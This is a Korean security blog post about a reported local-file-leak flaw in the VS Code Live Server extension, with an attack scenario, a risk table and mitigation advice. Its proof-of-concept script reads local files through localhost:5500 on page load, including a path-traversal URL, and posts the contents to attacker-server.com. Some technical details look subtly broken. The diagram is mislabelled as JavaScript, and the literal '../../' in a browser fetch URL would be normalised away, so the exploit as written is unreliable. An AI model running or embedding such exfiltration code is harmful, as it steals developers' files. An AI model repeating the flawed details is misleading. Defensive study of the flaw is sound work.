---
title: "🔒 Live Server: VS Code 확장 로컬 파일 유출 취약점 분석"
date: 2026-04-19T08:06:19+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

최근 프론트엔드 개발자라면 누구나 VS Code와 함께 사용하는 필수 확장 프로그램인 'Live Server'에서 심각한 보안 이슈가 보고되었습니다. 상황은 이렇습니다. 여러분이 새로운 프로젝트를 진행 중이라 Live Server로 로컬 호스트(localhost:5500)를 띄워두고, 개발 문서를 찾기 위해 웹 서핑을 하던 중이었습니다. 평소와 다름없는 아무런 해킹징후 없는 평화로운 오후입니다.

하지만 여러분이 방문한 특정 웹사이트가 악의적인 스크립트를 포함하고 있었다면 이야기는 완전히 달라집니다. 여러분의 브라우저는 백그라운드에서 조용히 로컬에 떠 있는 Live Server로 요청을 보내기 시작하고, 서버는 이를 받아들여 개발 중인 소스 코드, `.env` 파일, 심지어 SSH 키와 같은 민감한 파일을 응답으로 돌려줍니다. 순식간에 여러분의 하드 드라이브 안에 있는 정보가 인터넷상의 공격자에게 고스란히 유출되는 것입니다.

"내 컴퓨터에서 돌아가는 로컬 서버니까 안전하겠지?"라는 막연한 믿음이 얼마나 위험한지를 보여주는 사례입니다. 이번 글에서는 Live Server 취약점의 기술적 메커니즘을 깊이 분석하고, 실제 공격 시나리오를 시뮬레이션한 뒤, 이를 방어하기 위한 실질적인 가이드를 제시하겠습니다. 참고로, 모든 기술적 설명과 코드는 방어 목적의 학습을 위함임을 미리 밝힙니다.

## 본론

### 취약점의 기술적 원리와 공격 시나리오

Live Server는 정적 파일을 서비스하는 간단한 HTTP 서버입니다. 기본적으로 `127.0.0.1` 또는 `localhost`에서 리스닝하며, 개발자가 파일을 수정하면 브라우저를 새로고침해 주는 편리한 기능을 제공합니다. 문제는 이 서버가 특정 HTTP 요청에 대해 충분한 검증(Validation)을 수행하지 않거나, CORS(Cross-Origin Resource Sharing) 정책을 느슨하게 설정했을 때 발생합니다.

공격자는 CSRF(교차 사이트 요청 위조) 스타일의 공격을 시도합니다. 피해자가 악성 웹사이트에 방문하면, 그 페이지에 심어진 자바스크립트가 피해자의 브라우저를 통해 `http://localhost:5500`로 요청을 보냅니다. 브라우저는 이를 동일 출처(Same-Origin) 정책에 따라 제어해야 하지만, 로컬 서버의 설정이나 브라우저의 보안 정책 미스로 인해 요청이 허용될 수 있습니다.

아래는 이러한 공격 흐름을 간소화하여 도식화한 것입니다.

```javascript
graph LR
    A[Attacker Website] --> B[Victim Browser]
    B --> C[VS Code Live Server]
    C --> B
    B --> A
    C[VS Code Live Server] --> D[Local File System]
```

이 다이어그램에서 볼 수 있듯이, 공격자는 직접 개발자의 PC에 접근하는 것이 아니라 개발자의 브라우저를 '대포(Proxy)'처럼 이용하여 로컬 서버를 공격합니다. Live Server가 요청을 처리하는 과정에서 상위 디렉토리 접근(Path Traversal)을 제대로 차단하지 못한다면, 공격자는 프로젝트 루트를 넘어 시스템의 민감한 파일까지 탈취할 수 있습니다.

### PoC 개념 증명 코드

공격자가 어떻게 피해자의 로컬 파일을 탈취하는지 이해하기 위해 간단한 PoC 코드를 작성해 보겠습니다. 이 코드는 피해자의 브라우저에서 실행된다고 가정합니다. (※ 윤리적 경고: 아래 코드는 보안 연구 및 방어 목적으로만 사용해야 합니다.)

```html
<!-- 공격자가 운영하는 악성 웹사이트의 script 태그 -->
<script>
    async function exfiltrateFile() {
        const targetUrl = 'http://127.0.0.1:5500/../../windows/system32/drivers/etc/hosts'; 
        // 또는 프로젝트 내의 config 파일: http://127.0.0.1:5500/config/db.json
        
        try {
            const response = await fetch(targetUrl);
            if (response.ok) {
                const data = await response.text();
                // 탈취한 데이터를 공격자의 서버(C2)로 전송
                sendToAttacker(data);
            } else {
                console.log('File not found or access denied');
            }
        } catch (error) {
            console.error('Request failed:', error);
        }
    }

    function sendToAttacker(data) {
        // 데이터를 외부 서버로 전송하는 로직
        fetch('https://attacker-server.com/log', {
            method: 'POST',
            body: JSON.stringify({ stolenData: data })
        });
    }

    // 페이지 로드 시 즉시 실행
    exfiltrateFile();
</script>
```

이 코드가 실행되면 브라우저는 로컬 Live Server에 `../../` 경로를 포함한 요청을 보냅니다. 서버가 이 경로를 정제(Sanitize)하지 않고 파일 시스템을 읽는다면, 공격자는 원하는 파일의 내용을 `attacker-server.com`으로 받아볼 수 있습니다.

### 개발 환경별 위험도 분석

모든 개발 환경이 동일하게 위험한 것은 아닙니다. 사용하는 툴과 네트워크 환경에 따라 위험도는 달라집니다. 다음 표는 Live Server 사용 시 발생할 수 있는 위험도를 비교 분석한 것입니다.

| 비교 항목 | 안전한 구성 (Secure) | 취약한 구성 (Vulnerable) | 비고 |
| :--- | :--- | :--- | :--- |
| **네트워크 바인딩** | 127.0.0.1 (Loopback) 전용 | 0.0.0.0 (All Interfaces) | 공유기/Wi-Fi 환경에서 외부 접근 허용 여부 차이 |
| **OS 방화벽** | 인바운드 차단 규칙 적용 | 모든 인바운드 허용 | 로컬 서버 접근 제어 계층 |
| **브라우저 사용 습관** | 개발 시만 전용 브라우저/프로필 사용 | 일반적인 웹 서핑 겸용 | 악성 스크립트 실행 노출 면적 |
| **확장 프로그램 버전** | 최신 패치 적용 | 취약점이 존재하는 구버전 | Path Traversal 패치 여부 |
| **파일 권한** | 최소한의 읽기 권한 부여 | 과도한 권한 (User 쓰기 권한 등) | 탈취 외 파괴 가능성 |

### 단계별 완화 조치 및 가이드

이러한 취약점으로부터 개발 환경을 보호하기 위해 다음과 같은 단계별 가이드를 준수해야 합니다.

1.  **확장 프로그램 업데이트**     가장 기본적이면서 중요한 조치입니다. VS Code의 확장 프로그램 탭에서 'Live Server'를 검색하고, 개발자(Ritwick Dey)가 배포한 최신 버전으로 업데이트했는지 확인하세요. 패치가 되지 않은 버전을 사용하는 것은 문을 활짝 열어두고 다니는 것과 같습니다.

2.  **로컬 방화벽 규칙 설정**     Live Server가 사용하는 포트(기본값 5500)에 대해 인바운드 규칙을 설정하여 외부에서의 접근을 차단하세요. 심지어 `127.0.0.1` 바인딩이 되어 있더라도, 방화벽은 브라우저 기반 공격에 대한 2차 방어선이 될 수 있습니다.

3.  **개발용 브라우저 분리**     개발용으로 Chrome Canary, Firefox Developer Edition 등을 따로 설치하여 사용하고, 일상적인 웹 서핑(뉴스, SNS 등)은 일반 브라우저에서 진행하세요. 이렇게 하면 악성 웹사이트가 로컬 서버에 요청을 보낼 가능성을 원천적으로 차단할 수 있습니다.

4.  **민감 파일 격리 (.gitignore 및 환경 변수)**     소스 코드 내에 API 키, 비밀번호, 개인정보가 포함되지 않도록 철저히 관리해야 합니다. 로컬 파일 유출 취약점이 발생하더라도 탈취할 데이터가 없다면 피해는 최소화됩니다.

## 결론

VS Code Live Server의 로컬 파일 유출 취약점은 개발자 편의성을 위한 도구가 어떻게 보안의 허점이 되는지를 적나라하게 보여줍니다. 우리는 흔히 로컬 환경을 안전지대라고 착각하지만, 공격자는 이러한 심리를 교묘하게 이용하여 웹 브라우저를 경유로 로컬 자원을 노린다는 점을 명심해야 합니다.

이번 사례를 통해 얻은 핵심 교훈은 **"신뢰할 수 있는 출처에서 다운로드한 확장 프로그램이라도 지속적인 업데이트와 모니터링이 필수적"**이라는 것입니다. 또한, 개발 환경의 격리(Development Isolation)는 선택이 아닌 필수 보안 전략입니다.

이제 바로 여러분의 VS Code 확장 프로그램 목록을 확인해 보시기 바랍니다. 방어는 공격보다 빨라야 하며, 개발자의 작업 환경이 얼마나 튼튼하게 구축되어 있느냐가 서비스의 전체적인 보안 수준을 결정합니다.

### 참고자료
- [OX Security - Live Server Vulnerability Report](https://news.google.com/rss/articles/CBMigwFBVV95cUxQSzRCVTJrcHdyZHItYm1IMk9CcXdTQUJZaXhFODZ4ckNlLUw4UHdUaHdVLVBjc0ZJWFVtU3o0dExuZzItVW9lRkNoak5nT3B5Qks4N29HR2haRjRWMGJlQmk2dldaWEpKaVRvbDgyYlBHRlJyMzdCUVE1X2FPRnN5aC1UYw?oc=5)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [MDN Web Docs - CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

**출처**: [https://news.google.com/rss/articles/CBMigwFBVV95cUxQSzRCVTJrcHdyZHItYm1IMk9CcXdTQUJZaXhFODZ4ckNlLUw4UHdUaHdVLVBjc0ZJWFVtU3o0dExuZzItVW9lRkNoak5nT3B5Qks4N29HR2haRjRWMGJlQmk2dldaWEpKaVRvbDgyYlBHRlJyMzdCUVE1X2FPRnN5aC1UYw?oc=5](https://news.google.com/rss/articles/CBMigwFBVV95cUxQSzRCVTJrcHdyZHItYm1IMk9CcXdTQUJZaXhFODZ4ckNlLUw4UHdUaHdVLVBjc0ZJWFVtU3o0dExuZzItVW9lRkNoak5nT3B5Qks4N29HR2haRjRWMGJlQmk2dldaWEpKaVRvbDgyYlBHRlJyMzdCUVE1X2FPRnN5aC1UYw?oc=5)